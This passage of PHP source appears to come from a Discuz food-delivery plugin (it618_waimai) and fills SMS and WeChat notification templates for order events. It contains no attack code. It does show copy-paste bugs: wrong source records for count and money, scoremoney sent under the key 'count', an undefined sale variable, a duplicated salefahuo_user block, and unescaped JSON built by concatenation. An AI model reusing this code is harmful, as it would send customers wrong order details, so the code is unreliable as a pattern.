					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}
			}
		}
		
		if($type=='saletuihuo_shop'&&$it618_body_saletuihuo_shop_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
			
			$tel=$it618_waimai_waimai['it618_messagetel'];
			$Body=$it618_body_saletuihuo_shop;
			
			if($it618_waimai_waimai['it618_messageisok']==1){
				$uid=$it618_waimai_waimai['it618_uid'];
				$tplid_wxsms=$it618_body_saletuihuo_shop_tplid_wxsms;
				$body_wxsms=$it618_body_saletuihuo_shop_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
						$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}
	
				$ALDYBody=$Body;
				$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
				$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_saletuihuo_shop_tplid;
					
					$tmparr=explode("{user}",$ALDYBody);
					if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
					
					$tmparr=explode("{saleid}",$ALDYBody);
					if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}
			}
		}
		
		if($type=='sqpm_user'&&$it618_body_sqpm_user_isok==1){
			$it618_waimai_rwpeiman = C::t('#it618_waimai#it618_waimai_rwpeiman')->fetch_by_id($id);
			
			if($it618_waimai_rwpeiman['it618_state']==2){
				$checkvalue=$it618_waimai_lang['s1546'];
			}else{
				$checkvalue=$it618_waimai_lang['s1547'];
			}
			
			$tel=$it618_waimai_rwpeiman['it618_tel'];
			$Body=$it618_body_sqpm_user;
			
			$uid=$it618_waimai_rwpeiman['it618_uid'];
			$tplid_wxsms=$it618_body_sqpm_user_tplid_wxsms;
			$body_wxsms=$it618_body_sqpm_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{checkvalue}",$checkvalue,$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}

			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']),$Body);
			$Body=str_replace("{checkvalue}",$checkvalue,$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_sqpm_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']).'",';
				
				$tmparr=explode("{checkvalue}",$ALDYBody);
				if(count($tmparr)>1)$param.='"checkvalue":"'.$checkvalue.'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}
		}
		
		if($type=='sale_user'&&$it618_body_sale_user_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_sale_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_sale_user_tplid_wxsms;
			$body_wxsms=$it618_body_sale_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
					$tmpvalue=str_replace("{count}",$it618_waimai_gwcsale_main['it618_count'],$tmpvalue);
					$tmpvalue=str_replace("{money}",$it618_waimai_gwcsale_main['it618_money'],$tmpvalue);
					$tmpvalue=str_replace("{yunfei}",$it618_waimai_gwcsale_main['it618_yunfei'],$tmpvalue);
					$tmpvalue=str_replace("{scoremoney}",$it618_waimai_gwcsale_main['it618_scoremoney'],$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}

			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
			$Body=str_replace("{saleid}",$it618_waimai_sale['id'],$Body);
			$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
			$Body=str_replace("{count}",$it618_waimai_gwcsale_main['it618_count'],$Body);
			$Body=str_replace("{money}",$it618_waimai_gwcsale_main['it618_money'],$Body);
			$Body=str_replace("{yunfei}",$it618_waimai_gwcsale_main['it618_yunfei'],$Body);
			$Body=str_replace("{scoremoney}",$it618_waimai_gwcsale_main['it618_scoremoney'],$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_sale_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_sale['id'].'",';
				
				$tmparr=explode("{shopname}",$ALDYBody);
				if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
				
				$tmparr=explode("{count}",$ALDYBody);
				if(count($tmparr)>1)$param.='"count":"'.$it618_waimai_waimai['it618_count'].'",';
				
				$tmparr=explode("{money}",$ALDYBody);
				if(count($tmparr)>1)$param.='"money":"'.$it618_waimai_waimai['it618_money'].'",';
				
				$tmparr=explode("{yunfei}",$ALDYBody);
				if(count($tmparr)>1)$param.='"yunfei":"'.$it618_waimai_waimai['it618_yunfei'].'",';
				
				$tmparr=explode("{scoremoney}",$ALDYBody);
				if(count($tmparr)>1)$param.='"count":"'.$it618_waimai_waimai['it618_scoremoney'].'",';
				
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}
		}
		
		if($type=='salegetsale_user'&&$it618_body_salegetsale_user_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_salegetsale_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_salegetsale_user_tplid_wxsms;
			$body_wxsms=$it618_body_salegetsale_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}
			
			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
			$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
			$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_salegetsale_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
				
				$tmparr=explode("{shopname}",$ALDYBody);
				if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}

		}
		
		if($type=='salesqfahuo_user'&&$it618_body_salesqfahuo_user_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_salesqfahuo_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_salesqfahuo_user_tplid_wxsms;
			$body_wxsms=$it618_body_salesqfahuo_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}
			
			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
			$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
			$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_salesqfahuo_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
				
				$tmparr=explode("{shopname}",$ALDYBody);
				if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}

		}
		
		if($type=='salefahuo_user'&&$it618_body_salefahuo_user_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
			
			if($it618_waimai_gwcsale_main['it618_pmid']!='0'){
				$it618_waimai_peiman=C::t('#it618_waimai#it618_waimai_peiman')->fetch_by_pmid($it618_waimai_gwcsale_main['it618_pmid']);
				$peiman=$it618_waimai_gwcsale_main['it618_pmid'].'-'.$it618_waimai_peiman['it618_name'].' '.$it618_waimai_peiman['it618_tel'];
			}
			
			if($it618_waimai_gwcsale_main['it618_rwpmid']>0){
				$it618_waimai_rwpeiman=C::t('#it618_waimai#it618_waimai_rwpeiman')->fetch_by_id($it618_waimai_gwcsale_main['it618_rwpmid']);
				$peiman=$it618_waimai_gwcsale_main['it618_rwpmid'].'-'.it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']).'-'.$it618_waimai_rwpeiman['it618_name'].' '.$it618_waimai_rwpeiman['it618_tel'];
			}
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_salefahuo_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_salefahuo_user_tplid_wxsms;
			$body_wxsms=$it618_body_salefahuo_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
					$tmpvalue=str_replace("{peiman}",$peiman,$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}

			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
			$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
			$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
			$Body=str_replace("{peiman}",$peiman,$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_salefahuo_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
				
				$tmparr=explode("{shopname}",$ALDYBody);
				if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
				
				$tmparr=explode("{peiman}",$ALDYBody);
				if(count($tmparr)>1)$param.='"peiman":"'.$peiman.'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}
		}
		
		if($type=='salegetok_user'&&$it618_body_salegetok_user_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
			
			if($it618_waimai_gwcsale_main['it618_pmid']!='0'){
				$it618_waimai_peiman=C::t('#it618_waimai#it618_waimai_peiman')->fetch_by_pmid($it618_waimai_gwcsale_main['it618_pmid']);
				$peiman=$it618_waimai_gwcsale_main['it618_pmid'].'-'.$it618_waimai_peiman['it618_name'].' '.$it618_waimai_peiman['it618_tel'];
			}
			
			if($it618_waimai_gwcsale_main['it618_rwpmid']>0){
				$it618_waimai_rwpeiman=C::t('#it618_waimai#it618_waimai_rwpeiman')->fetch_by_id($it618_waimai_gwcsale_main['it618_rwpmid']);
				$peiman=$it618_waimai_gwcsale_main['it618_rwpmid'].'-'.it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']).'-'.$it618_waimai_rwpeiman['it618_name'].' '.$it618_waimai_rwpeiman['it618_tel'];
			}
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_salegetok_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_salegetok_user_tplid_wxsms;
			$body_wxsms=$it618_body_salegetok_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
					$tmpvalue=str_replace("{peiman}",$peiman,$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}

			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
			$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
			$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
			$Body=str_replace("{peiman}",$peiman,$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_salegetok_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
				
				$tmparr=explode("{shopname}",$ALDYBody);
				if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
				
				$tmparr=explode("{peiman}",$ALDYBody);
				if(count($tmparr)>1)$param.='"peiman":"'.$peiman.'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}
		}
		
		if($type=='salefahuo_user'&&$it618_body_salefahuo_user_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
			
			if($it618_waimai_gwcsale_main['it618_pmid']!='0'){
				$it618_waimai_peiman=C::t('#it618_waimai#it618_waimai_peiman')->fetch_by_pmid($it618_waimai_gwcsale_main['it618_pmid']);
				$peiman=$it618_waimai_gwcsale_main['it618_pmid'].'-'.$it618_waimai_peiman['it618_name'].' '.$it618_waimai_peiman['it618_tel'];
			}
			
			if($it618_waimai_gwcsale_main['it618_rwpmid']>0){
				$it618_waimai_rwpeiman=C::t('#it618_waimai#it618_waimai_rwpeiman')->fetch_by_id($it618_waimai_gwcsale_main['it618_rwpmid']);
				$peiman=$it618_waimai_gwcsale_main['it618_rwpmid'].'-'.it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']).'-'.$it618_waimai_rwpeiman['it618_name'].' '.$it618_waimai_rwpeiman['it618_tel'];
			}
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_salefahuo_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_salefahuo_user_tplid_wxsms;
			$body_wxsms=$it618_body_salefahuo_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
					$tmpvalue=str_replace("{peiman}",$peiman,$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}

			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
			$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
			$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
			$Body=str_replace("{peiman}",$peiman,$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_salefahuo_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
				
				$tmparr=explode("{shopname}",$ALDYBody);
				if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
				
				$tmparr=explode("{peiman}",$ALDYBody);
				if(count($tmparr)>1)$param.='"peiman":"'.$peiman.'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}
		}
		
		if($type=='saletuihuo_user'&&$it618_body_saletuihuo_user_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_saletuihuo_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_saletuihuo_user_tplid_wxsms;
			$body_wxsms=$it618_body_saletuihuo_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}

			$ALDYBody=$Body;
			$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_saletuihuo_user_tplid;
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}
		}
		
		if($type=='saletuihuo1_user'&&$it618_body_saletuihuo1_user_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_saletuihuo1_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_saletuihuo1_user_tplid_wxsms;
			$body_wxsms=$it618_body_saletuihuo1_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}

			$ALDYBody=$Body;
			$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_saletuihuo1_user_tplid;
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}
		}
		
		if($type=='saleok_user'&&$it618_body_saleok_user_isok==1){
			$tmpurl=it618_waimai_getrewrite('waimai_wap','uc@'.$id,'plugin.php?id=it618_waimai:wap&pagetype=uc&cid='.$id);
			
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
			
			if($it618_waimai_gwcsale_main['it618_pmid']!='0'){
				$it618_waimai_peiman=C::t('#it618_waimai#it618_waimai_peiman')->fetch_by_pmid($it618_waimai_gwcsale_main['it618_pmid']);
				$peiman=$it618_waimai_gwcsale_main['it618_pmid'].'-'.$it618_waimai_peiman['it618_name'].' '.$it618_waimai_peiman['it618_tel'];
			}
			
			if($it618_waimai_gwcsale_main['it618_rwpmid']>0){
				$it618_waimai_rwpeiman=C::t('#it618_waimai#it618_waimai_rwpeiman')->fetch_by_id($it618_waimai_gwcsale_main['it618_rwpmid']);
				$peiman=$it618_waimai_gwcsale_main['it618_rwpmid'].'-'.it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']).'-'.$it618_waimai_rwpeiman['it618_name'].' '.$it618_waimai_rwpeiman['it618_tel'];
			}
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_saleok_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_saleok_user_tplid_wxsms;
			$body_wxsms=$it618_body_saleok_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
					$tmpvalue=str_replace("{peiman}",$peiman,$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}

			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
			$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
			$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
			$Body=str_replace("{peiman}",$peiman,$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_saleok_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
				
				$tmparr=explode("{shopname}",$ALDYBody);
				if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
				
				$tmparr=explode("{peiman}",$ALDYBody);
				if(count($tmparr)>1)$param.='"peiman":"'.$peiman.'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}
		}
		
		if($type=='tk_user'&&$it618_body_tk_user_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			
			$tel=$it618_waimai_gwcsale_main['it618_tel'];
			$Body=$it618_body_tk_user;
			
			$uid=$it618_waimai_gwcsale_main['it618_uid'];
			$tplid_wxsms=$it618_body_tk_user_tplid_wxsms;
			$body_wxsms=$it618_body_tk_user_wxsms;
